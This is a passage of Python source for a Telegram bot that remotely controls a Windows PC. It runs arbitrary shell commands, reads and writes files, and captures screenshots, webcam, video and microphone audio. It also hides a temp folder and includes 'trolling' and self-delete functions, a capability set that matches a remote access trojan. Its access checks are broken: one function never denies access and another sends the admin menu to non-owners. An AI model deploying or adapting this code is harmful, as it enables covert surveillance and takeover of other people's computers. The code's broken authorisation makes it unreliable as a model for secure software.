# AUTHOR'S GITHUB: github.com/resppl
# SCRIPT ON GITHUB: github.com/resppl/TelegramRemotePC
# AUTHOR'S WEBSITE: resppl.su

import os, pyautogui, subprocess, keyboard, psutil, sqlite3, cv2, pyaudio, wave, asyncio, time

from shutil import rmtree, disk_usage
from ctypes import windll
from telebot import types, TeleBot
from typing import List
from random import randint
from time import sleep
import urllib.parse
from platform import uname
from pygetwindow import getActiveWindowTitle
from http.client import HTTPConnection
from webbrowser import open as webopen
from datetime import datetime
from screen_brightness_control import set_brightness, get_brightness

conn = sqlite3.connect('visitors.db')
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS visitors (id INTEGER PRIMARY KEY)''')
conn.commit()
conn.close()


conn = sqlite3.connect('fulldostup.db')
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users_with_access (user_id INTEGER PRIMARY KEY)''')
conn.commit()
conn.close()

KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c", "ctrl+v", "ctrl+s", "ctrl+shift+esc"]
CMDS = ['tasklist', 'ping']

title_files_and_folders = "📂 Managing files and folders"
title_keys = "⌨️ Key management"
title_console = "💻 Console management"
title_settings_pc = "⚙️ PC Settings"
title_trolling = "😈 Trolling"
title_specfunc = "🛠️ Special functions"
title_info_cmd = "💡 Information about the script"

text_give_access = "✅ Grant full access"
text_list_access = "📋 List of users with full access"
text_remove_access = "❌ Take away full access"


wrong_choice = "❌ *Wrong choice! Please try again*"

back_text = "◀️ Вернуться"

file_menu_create_files_and_folders = "📋 Create a file / folder"
file_menu_delete_files_and_folders = "🗑 Delete a file / folder"
file_menu_edit_files = "✏️ Edit a file"
file_menu_start_programm = "🚀 Run the executable file"
file_menu_download_file_by_pc = "⬇️ Download a file from a PC"
file_menu_upload_file_to_pc = "⬆️ Upload a file to a PC"

console_menu_enter_commands = "⌨️ Enter the command"
console_menu_start_python_script = "🗄 Run the Python script"
console_menu_screenshot = "🖥 Take a screenshot of the screen"
console_menu_webcam = "📸 Take a webcam photo"
console_menu_webvideocam = "📹 Record video on camera"
console_menu_check_directories = "📂 Computer directory"
console_menu_microphone = "🎙 Record a voice"
console_menu_open_site = "🌐 Open a website"
console_menu_create_msgbox = "❗️ Create a message in a dialog box (MSGBOX)"
console_menu_list_process = "📋 List of active processes"

keys_menu_write = "⌨️ Print the text"
keys_menu_press_keys = "⌨️ Press the key"
keys_menu_media_keys = "▶️⏸⏹ Press the media key"

settings_pc_menu_change_brightness = "☀️ Change the screen brightness"
settings_pc_menu_info_pc = "🖥 Information about the PC"
settings_pc_menu_change_volume = "🔊 Change the volume"

packs_menu_open_sites = "🌐 Open many sites"
packs_menu_open_conductors = "📂 Open a lot of conductors"
packs_menu_moving_mouse = "🖱 Moving the mouse"
packs_menu_open_cmds = "🗄 Open multiple Command Console windows"

admin_panel_text = "🔒 Administrative Panel"

specfunc_menu_restart_pc = "🔄 Restart the computer"
specfunc_menu_logout_your_account = "👤 Log out of your account"
specfunc_menu_turn_off_pc = "❌ Turn off the computer"
specfunc_menu_logout_script = "📂 Exit the script"
specfunc_menu_delete_script_by_folders = "📂 Delete the folder with the script"

specfunc_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
specfunc_keyboard.add(types.KeyboardButton(specfunc_menu_restart_pc), types.KeyboardButton(specfunc_menu_logout_your_account), types.KeyboardButton(specfunc_menu_turn_off_pc))
specfunc_keyboard.add(types.KeyboardButton(specfunc_menu_logout_script), types.KeyboardButton(specfunc_menu_delete_script_by_folders))
specfunc_keyboard.add(types.KeyboardButton(back_text))


mainmenu_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
mainmenu_keyboard.add(types.KeyboardButton(title_files_and_folders), types.KeyboardButton(title_keys))
mainmenu_keyboard.add(types.KeyboardButton(title_console), types.KeyboardButton(title_settings_pc))
mainmenu_keyboard.add(types.KeyboardButton(title_trolling), types.KeyboardButton(title_specfunc))
mainmenu_keyboard.add(types.KeyboardButton(title_info_cmd))

mainmenu_keyboard_admin = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
mainmenu_keyboard_admin.add(types.KeyboardButton(title_files_and_folders), types.KeyboardButton(title_keys))
mainmenu_keyboard_admin.add(types.KeyboardButton(title_console), types.KeyboardButton(title_settings_pc))
mainmenu_keyboard_admin.add(types.KeyboardButton(title_trolling), types.KeyboardButton(title_specfunc))
mainmenu_keyboard_admin.add(types.KeyboardButton(title_info_cmd), types.KeyboardButton(admin_panel_text))


back_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
back_keyboard.add(types.KeyboardButton(back_text))

change_file_menu_text_add_content = "➕ Add content"
change_file_menu_text_full_edit_content = "✏️ Completely change the content"
change_file_menu_text_clear_file = "🗑 Clear the file"

delete_menu_text_delete_file = "🗑 Delete a file"
delete_menu_text_delete_folder = "🗑 Delete a folder"

download_on_pc_menu_text_upload_photo = "⬆️🖼 Upload a photo"
download_on_pc_menu_text_upload_other = "⬆️📂 Upload another"

files_menu_check_text_create_file = "➕ Create a file"
files_menu_check_text_create_folder = "➕ Create a folder"

media_keys_text_start_or_pause = "▶️⏸⏹ Start / Stop"

if_confirm = "Yes, I confirm"
if_deny = "No, I have changed my mind"

full_dostup_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
full_dostup_keyboard.add(types.KeyboardButton(text_give_access))
full_dostup_keyboard.add(types.KeyboardButton(text_list_access))
full_dostup_keyboard.add(types.KeyboardButton(text_remove_access))
full_dostup_keyboard.add(types.KeyboardButton(back_text))

pc_settings_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
pc_settings_keyboard.add(types.KeyboardButton(settings_pc_menu_change_brightness), types.KeyboardButton(settings_pc_menu_info_pc), types.KeyboardButton(settings_pc_menu_change_volume))
pc_settings_keyboard.add(types.KeyboardButton(back_text))

packs_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
packs_keyboard.add(types.KeyboardButton(packs_menu_open_sites), types.KeyboardButton(packs_menu_open_conductors))
packs_keyboard.add(types.KeyboardButton(packs_menu_moving_mouse), types.KeyboardButton(packs_menu_open_cmds))
packs_keyboard.add(types.KeyboardButton(back_text))

logout_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
logout_keyboard.add(types.KeyboardButton(if_confirm), types.KeyboardButton(if_deny))

off_computer_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
off_computer_keyboard.add(types.KeyboardButton(if_confirm), types.KeyboardButton(if_deny))

reboot_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
reboot_keyboard.add(types.KeyboardButton(if_confirm), types.KeyboardButton(if_deny))

menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
menu_keyboard.add(types.KeyboardButton(keys_menu_write), types.KeyboardButton(keys_menu_press_keys), types.KeyboardButton(keys_menu_media_keys))
menu_keyboard.add(types.KeyboardButton(back_text))

media_keys_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
media_keys_keyboard.add(types.KeyboardButton(media_keys_text_start_or_pause))
media_keys_keyboard.add(types.KeyboardButton(back_text))

console_menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
console_menu_keyboard.add(types.KeyboardButton(console_menu_enter_commands), types.KeyboardButton(console_menu_start_python_script))
console_menu_keyboard.add(types.KeyboardButton(console_menu_screenshot), types.KeyboardButton(console_menu_open_site))
console_menu_keyboard.add(types.KeyboardButton(console_menu_webcam), types.KeyboardButton(console_menu_webvideocam))
console_menu_keyboard.add(types.KeyboardButton(console_menu_microphone), types.KeyboardButton(console_menu_list_process))
console_menu_keyboard.add(types.KeyboardButton(console_menu_create_msgbox), types.KeyboardButton(console_menu_check_directories))
console_menu_keyboard.add(types.KeyboardButton(back_text))

files_menu_check_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
files_menu_check_keyboard.add(types.KeyboardButton(files_menu_check_text_create_file), types.KeyboardButton(files_menu_check_text_create_folder))
files_menu_check_keyboard.add(types.KeyboardButton(back_text))

files_menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
files_menu_keyboard.add(types.KeyboardButton(file_menu_create_files_and_folders), types.KeyboardButton(file_menu_delete_files_and_folders))
files_menu_keyboard.add(types.KeyboardButton(file_menu_edit_files), types.KeyboardButton(file_menu_start_programm))
files_menu_keyboard.add(types.KeyboardButton(file_menu_download_file_by_pc), types.KeyboardButton(file_menu_upload_file_to_pc))
files_menu_keyboard.add(types.KeyboardButton(back_text))

script_exit_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
script_exit_keyboard.add(types.KeyboardButton(if_confirm), (types.KeyboardButton(if_deny)))

download_on_pc_menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
download_on_pc_menu_keyboard.add(types.KeyboardButton(download_on_pc_menu_text_upload_photo), types.KeyboardButton(download_on_pc_menu_text_upload_other))
download_on_pc_menu_keyboard.add(types.KeyboardButton(back_text))

delete_menu_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
delete_menu_keyboard.add(types.KeyboardButton(delete_menu_text_delete_file), types.KeyboardButton(delete_menu_text_delete_folder))
delete_menu_keyboard.add(types.KeyboardButton(back_text))

change_file_menu_keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
change_file_menu_keyboard.add(types.KeyboardButton(change_file_menu_text_add_content), types.KeyboardButton(change_file_menu_text_full_edit_content), types.KeyboardButton(change_file_menu_text_clear_file))
change_file_menu_keyboard.add(types.KeyboardButton(back_text))

admin_panel_text_access_control = "🗝️ Full Access Control"

access_control_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
access_control_keyboard.add(text_give_access)
access_control_keyboard.add(text_remove_access)
access_control_keyboard.add(text_list_access)

admin_panel_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
admin_panel_keyboard.add(types.KeyboardButton(admin_panel_text_access_control))
admin_panel_keyboard.add(types.KeyboardButton(back_text))

directories_check_all_directories = "📂 View the entire computer directory"
directories_search_directories = "📂 Select the computer directory"

directories_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
directories_keyboard.add(types.KeyboardButton(directories_check_all_directories))
directories_keyboard.add(types.KeyboardButton(directories_search_directories))
directories_keyboard.add(types.KeyboardButton(back_text))

TOKEN = "YOUR_BOT_TOKEN_HERE" # change it to your token
ACCESS = YOUR_ID_TELEGRAM # change to your telegram ID

LOGGING = False # if you want the logs to be displayed, then set the value to True, if not, then leave it as is (false)

bot = TeleBot(TOKEN, parse_mode=None) 
pyautogui.FAILSAFE = False

try:
    def make_temp_folder():    
        os.mkdir(r'C:\temp')
        kernel32 = windll.kernel32
        attr = kernel32.GetFileAttributesW(r'C:\temp')
        kernel32.SetFileAttributesW(r'C:\temp', attr | 2)
        return True


    def is_access_denied(member: types.User):
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")

        if member.id != [row[0] for row in cursor.fetchall()]: 
            return False
        if member.id == bot.user.id: 
            return False
        if member.id != ACCESS: 
            return True

    conn = HTTPConnection("ifconfig.me")
    try:
        conn.request("GET", "/ip")
        ip = conn.getresponse().read()
    except:
        ip = "unknown"

    total_mem, used_mem, free_mem = disk_usage('.')
    gb = 10 ** 9
    login = os.getlogin()
    width, height = pyautogui.size()
    oper = uname()
    try: virtual_memory = psutil.virtual_memory()
    except: virtual_memory = 'unknown'

    try: battery = str(psutil.sensors_battery()[0]) + '%'
    except: battery = 'unknown'

    @bot.message_handler(commands=['start'])
    def start(message: types.Message):
        conn = sqlite3.connect('visitors.db')
        cursor = conn.cursor()
        user_id = message.from_user.id
        cursor.execute("SELECT id FROM visitors WHERE id=?", (user_id,))
        existing_user = cursor.fetchone()

        if not existing_user:
            cursor.execute("INSERT INTO visitors (id) VALUES (?)", (user_id,))
            conn.commit()
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")
        
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "*📌 You have moved to the administrative main menu!*", reply_markup=mainmenu_keyboard_admin, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main_admin)
        elif message.from_user.id in [row[0] for row in cursor.fetchall()]:
            bot.send_message(message.chat.id, '*📌 You have moved to the main menu!*', reply_markup=mainmenu_keyboard, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main)

    def mainmenu(message: types.Message):
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        
        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id != ACCESS:
            bot.send_message(message.chat.id, "*📌 You have moved to the administrative main menu!*", reply_markup=mainmenu_keyboard_admin, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main_admin)
        elif message.from_user.id in [row[0] for row in cursor.fetchall()]:
            bot.send_message(message.chat.id, '*📌 You have moved to the main menu!*', reply_markup=mainmenu_keyboard, parse_mode='Markdown')
            return bot.register_next_step_handler(message, check_main)

    def check_main(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        elif message.text.strip() == title_files_and_folders: return files_menu(message)
        elif message.text.strip() == title_console: return console_menu(message)
        elif message.text.strip() == title_keys: return keyboard_menu(message)
        elif message.text.strip() == title_trolling: return packs(message)
        elif message.text.strip() == title_specfunc: return other_functions(message)
        elif message.text.strip() == title_settings_pc: return pc_settings(message)
        elif message.text.strip() == title_info_cmd: return info_script(message)
        elif message.text.strip() == '/start': return start(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return mainmenu(message)

    def check_main_admin(message: types.Message):
        if message.from_user.id == ACCESS:
            if message.text.strip() == title_files_and_folders: return files_menu(message)
            elif message.text.strip() == title_console: return console_menu(message)
            elif message.text.strip() == title_keys: return keyboard_menu(message)
            elif message.text.strip() == title_trolling: return packs(message)
            elif message.text.strip() == title_specfunc: return other_functions(message)
            elif message.text.strip() == title_settings_pc: return pc_settings(message)
            elif message.text.strip() == title_info_cmd: return info_script(message)
            elif message.text.strip() == admin_panel_text: return admin_panel(message)
            elif message.text.strip() == '/start': return start(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return mainmenu(message)

    def list_files(startpath):
        result = ''
        for root, dirs, files in os.walk(startpath):
            level = root.replace(startpath, '').count(os.sep)
            indent = ' ' * 4 * (level)
            result += '{}{}/\n'.format(indent, os.path.basename(root))
            subindent = ' ' * 4 * (level + 1)
            for f in files:
                result += '{}{}\n'.format(subindent, f)
        return result

    def admin_panel(message: types.Message):

        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "🔒 You have moved to the administrative section", reply_markup=admin_panel_keyboard)
            return bot.register_next_step_handler(message, admin_panel_check)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌")

    def admin_panel_check(message: types.Message):
        if message.from_user.id == ACCESS:
            if message.text.strip() == admin_panel_text_access_control: 
                return access_control(message)
            elif message.text.strip() == '/start': return start(message)
            elif message.text.strip() == back_text: return start(message)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌")
        
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return admin_panel(message)



    def access_control(message: types.Message):
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "You have gone to the full access control section, select the action you want to perform.", reply_markup=full_dostup_keyboard)
            bot.register_next_step_handler(message, access_control_check)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌")

    def access_control_check(message: types.Message):
        if message.from_user.id == ACCESS:
            if message.text.strip() == text_give_access: return give_access(message)
            elif message.text.strip() == text_remove_access: return take_access(message)
            elif message.text.strip() == text_list_access: return list_users_with_access(message)
            elif message.text.strip() == back_text: return admin_panel(message)
            elif message.text.strip() == '/start': return start(message)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌")

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')

    def list_users_with_access(message: types.Message):
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()

        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id == ACCESS:
            conn = sqlite3.connect('fulldostup.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("CREATE TABLE IF NOT EXISTS users_with_access (user_id INTEGER)")
            cursor.execute("SELECT user_id FROM users_with_access")
            users_with_access = cursor.fetchall()

            if not users_with_access:
                bot.send_message(message.chat.id, "🔐 The list of users with full access is empty")
                return access_control(message)
            else:
                users_list = '\n- '.join(str(user[0]) for user in users_with_access)
                bot.send_message(message.chat.id, f"🔐 List of users with full access: 🔐\n- {users_list}")
                cursor.close()
                conn.close()
                return access_control(message)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌") 

    def take_access(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "🔒 To revoke access, you must enter a unique Telegram user ID. Please specify the ID of the user who needs to revoke access to the system", reply_markup=back_keyboard)
            bot.register_next_step_handler(message, take_access_step)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌")

    def take_access_step(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        user_id = int(message.text)

        conn = sqlite3.connect('fulldostup.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users_with_access WHERE user_id=?", (user_id,))
        user = cursor.fetchone()

        conn_visitors = sqlite3.connect('visitors.db')
        cursor_visitors = conn_visitors.cursor()
        cursor_visitors.execute("SELECT id FROM visitors WHERE id=?", (user_id,))
        visitor = cursor_visitors.fetchone()

        if visitor:
            if user:
                cursor.execute("DELETE FROM users_with_access WHERE user_id=?", (user_id,))
                conn.commit()
                bot.send_message(message.chat.id, f"⛔️ The user with the ID {user_id} has lost full access")
                bot.send_message(user_id, f"⛔️ We regret to inform you that access to computer management for your account has been revoked. This means that you are no longer given the opportunity to control various functions and processes on your computer.\n\nℹ️ According to our records, the administrator has decided to restrict your access due to a violation of the established rules or for another serious reason.")
                return access_control(message)
            else:
                bot.send_message(message.chat.id, f"⚠️ The specified user has not been found or has already been denied access")
                cursor.close()
                conn.close()
                return access_control(message)
        else:
            bot.send_message(message.chat.id, "❌ This user is not registered in the system ❌")
            return access_control(message)

    def give_access(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "🔐 To grant access, you must enter a unique Telegram user ID. Please specify the ID of the user to whom you want to grant access to the system", reply_markup=back_keyboard)
            bot.register_next_step_handler(message, give_access_step)
        else:
            bot.send_message(message.chat.id, "❌ You are not allowed to access this section ❌")

    def give_access_step(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        user_id = int(message.text)
        if user_id > 0:
            conn = sqlite3.connect('fulldostup.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("SELECT user_id FROM users_with_access WHERE user_id=?", (user_id,))
            existing_user = cursor.fetchone()

            if existing_user:
                bot.send_message(message.chat.id, "⚠️ The specified user already has full access")
                return access_control(message)
            else:
                conn_visitors = sqlite3.connect('visitors.db')
                cursor_visitors = conn_visitors.cursor()
                cursor_visitors.execute("SELECT id FROM visitors WHERE id=?", (user_id,))
                visitor = cursor_visitors.fetchone()

                if visitor:
                    cursor.execute("INSERT INTO users_with_access (user_id) VALUES (?)", (user_id,))
                    conn.commit()
                    bot.send_message(message.chat.id, f"🔐 The user with the ID {user_id} was granted full access")

                    bot.send_message(user_id, "🔐 We are pleased to inform you that your account has been granted full access to computer management. This means that now you have the opportunity to control various functions and processes on computers.\n\n⚠️ However, I would like to remind you that when using this function, you are fully responsible for any actions performed on the computer. We are not responsible for any damage or loss of data that may result from your activities.\n\n🛡 Please be careful and careful when using this functionality. Your safety and data security is our top priority.")
                    return access_control(message)
                else:
                    bot.send_message(message.chat.id, "❌ This user is not registered in the system ❌")
                    return access_control(message)

        else:
            bot.send_message(message.chat.id, "🔒 The user ID must consist of positive numbers")
            return access_control(message)

    def info_script(message: types.Message):

        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, '🖥️ Welcome to the official computer management bot via Telegram! 🤖\n\nThis innovative bot gives you the ability to control your computer, perform various actions and manage applications directly from your mobile device. With this bot, you can manage processes on your computer, transfer files, run programs and much more.\n\n🔒 Please remember that all actions performed through this bot are subject to your control and responsibility. Be careful and careful when using computer control functions.\n\n💡 Our bot is designed to facilitate your work and improve the efficiency of interaction with your computer. Enjoy the convenience of controlling your computer via Telegram and do not forget about the possibilities that this innovative tool provides you with.\n\n🚨 If you find errors or have new ideas, you can contact me via Telegram messenger @resppl.\n\n👨‍💻 Thank you for choosing our bot to control your computer via Telegram!\n\nSincerely,\nYour [resppl](https://resppl.ru).\n\nThe script on GitHub: [TelegramRemotePC](https://github.com/resppl/telegramremotepc/)\nContact the owner - [@resppl](t.me/resppl)', disable_web_page_preview=True, parse_mode="Markdown")
        
        return start(message)

    def record_audio(record_seconds):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        WAVE_OUTPUT_FILENAME = "output.wav"

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * record_seconds)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        return WAVE_OUTPUT_FILENAME

    def console_commands(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try:
            output=subprocess.getoutput(message.text.strip(), encoding='cp866')

            if len(output) > 1999:
                if os.path.exists('C:\\temp\\') == False: make_temp_folder

                bot.send_message(message.chat.id, f'☑️ The command *{message.text.strip()}* was successfully executed\n\nThe response from the console turned out to be *too long* and was *saved to the file below*!', parse_mode = "Markdown", reply_markup=back_keyboard)
                my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
                my_file.write(output)
                my_file.close()
                bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
                os.remove('C:\\temp\\ConsoleOutput.txt')
                return bot.register_next_step_handler(message, console_commands)

            bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
            return bot.register_next_step_handler(message, console_commands)

        except:
            bot.send_message(message.chat.id, f'☑️ The command *{message.text.strip()}* was successfully executed\n\nThe response from the console turned out to be *an empty string*!', parse_mode = "Markdown")
            return bot.register_next_step_handler(message, console_commands)


    def python_scripts(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return console_menu(message)
        
        bot.send_message(message.chat.id, f'☑️ *The Python script along the path "{message.text.strip()}" has been launched!*', parse_mode = "Markdown")
        console_menu(message)

        try:
            output=subprocess.getoutput(f'python {message.text.strip()}', encoding='cp866')
            bot.send_message(message.chat.id, f'☑️ *The Python script along the path "{message.text.strip()}" was executed successfully!\nLog below*', parse_mode = "Markdown")
            return bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

        except: return bot.send_message(message.chat.id, f'❌ *The Python script along the path {message.text.strip()} was not started due to an error!', parse_mode = "Markdown")


    def create_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
            
        try:
            my_file = open(message.text.strip(), "w")
            my_file.close()
            bot.send_message(message.chat.id, '✍️ *Enter the contents of the file!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, create_file_check, message.text.strip())

        except:
            bot.send_message(message.chat.id, '❌ Error: *no access or not enough space*', parse_mode="Markdown")
            return files_menu(message)

    def create_file_check(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None      
        
        if message.text.strip() == '/start': return start(message)

        with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
        bot.send_message(message.chat.id, f'☑️ File *{route}* created successfully!', parse_mode="Markdown")
        return files_menu(message)


    def change_file_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*✍️ Choose an action!*', reply_markup=change_file_menu_keyboard, parse_mode="Markdown")
        return bot.register_next_step_handler(message, change_file_check)
        
    def change_file_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == change_file_menu_text_add_content: return add_in_file_content(message)
        elif message.text.strip() == change_file_menu_text_clear_file: return clean_file(message)
        elif message.text.strip() == change_file_menu_text_full_edit_content: return change_file(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode="Markdown")
        return change_file_menu(message)


    def change_file(message: types.Message):
        if is_access_denied(message.from_user): return None    
        bot.send_message(message.chat.id, '📝 *Please provide the path to the file (if the file is in the executable folder, just provide the name)*', parse_mode="Markdown", reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, change_file_new_content)

    def change_file_new_content(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return change_file_menu(message)

        bot.send_message(message.chat.id, '✍️ *Please provide new content!*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, change_file_finish, message.text.strip())

    def change_file_finish(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
        
        try:
            if message.text.strip() == '/start': return start(message)
            elif message.text.strip() == back_text: return change_file_menu(message)

            with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
            bot.send_message(message.chat.id, f'☑️ File *{route}* was successfully modified!!', parse_mode="Markdown")
            return change_file_menu(message)

        except:
            bot.send_message(message.chat.id, '❌ Error: *no access or file does not exist!*', parse_mode="Markdown")
            return change_file_menu(message)


    def clean_file(message: types.Message):
        if is_access_denied(message.from_user): return None    
        bot.send_message(message.chat.id, '✍️ *Specify the path to the file (if the file is in the executable folder, just write the name)*', parse_mode="Markdown", reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, clean_file_check)

    def clean_file_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return change_file_menu(message)

        try:
            with open(message.text.strip(), 'w+', encoding = 'utf-8') as file: file.write("")
            bot.send_message(message.chat.id, f'☑️ The file *{message.text.strip()}* was successfully cleared!', parse_mode='Markdown')
            return change_file_menu(message)
        
        except:
            bot.send_message(message.chat.id, '❌ Error: *no access or file does not exist*', parse_mode='Markdown')
            return change_file_menu(message)


    def add_in_file_content(message: types.Message):
        if is_access_denied(message.from_user): return None    
        bot.send_message(message.chat.id, '✍️ *Enter the file name with extension or the path to the desired file*', parse_mode='Markdown', reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, add_in_file_text)

    def add_in_file_text(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text:return change_file_menu(message)

        bot.send_message(message.chat.id, '✍️ *Please indicate what needs to be added!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, add_in_file_finish, message.text.strip())

    def add_in_file_finish(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return change_file_menu(message)

        try:
            with open(route, 'w+', encoding='utf-8') as file: file.write(message.text.strip()) 
            bot.send_message(message.chat.id, f'☑️ File *{route}* successfully created/modified!', parse_mode='Markdown')
            return change_file_menu(message)
        
        except:
            bot.send_message(message.chat.id, '❌ Error: *no access or file does not exist!*', parse_mode='Markdown')
            return change_file_menu(message)


    def delete_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '✍️ *Choose what you need*', reply_markup=delete_menu_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_delete_menu)

    def check_delete_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == delete_menu_text_delete_folder: return delete_folder(message)
        elif message.text.strip() == delete_menu_text_delete_file: return delete_file(message)
            
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return delete_menu(message)


    def delete_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*✍️ Enter the path to the file that needs to be deleted (or just the file name with extension if it is in the current folder)!*', parse_mode='Markdown', reply_markup=back_keyboard)
